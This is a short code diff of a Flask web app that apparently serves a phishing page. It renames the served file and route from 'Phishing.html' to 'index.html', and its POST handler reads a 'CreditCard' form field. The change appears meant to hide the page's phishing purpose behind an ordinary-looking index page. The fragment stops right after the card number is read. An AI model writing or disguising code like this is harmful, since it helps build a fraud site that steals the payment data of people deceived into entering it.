@@ -3,13 +3,13 @@ from flask import Flask, request, send_from_directory
 
 
 BASE_DIR = Path(__file__).resolve().parent
-HTML_FILE = "Phishing.html"
+HTML_FILE = "index.html"
 
 app = Flask(__name__)
 
 
 @app.route("/", methods=["GET", "POST"])
-@app.route("/Phishing.html", methods=["GET", "POST"])
+@app.route("/index.html", methods=["GET", "POST"])
 def show_page():
     if request.method == "POST":
         creditcard = request.form.get("CreditCard")
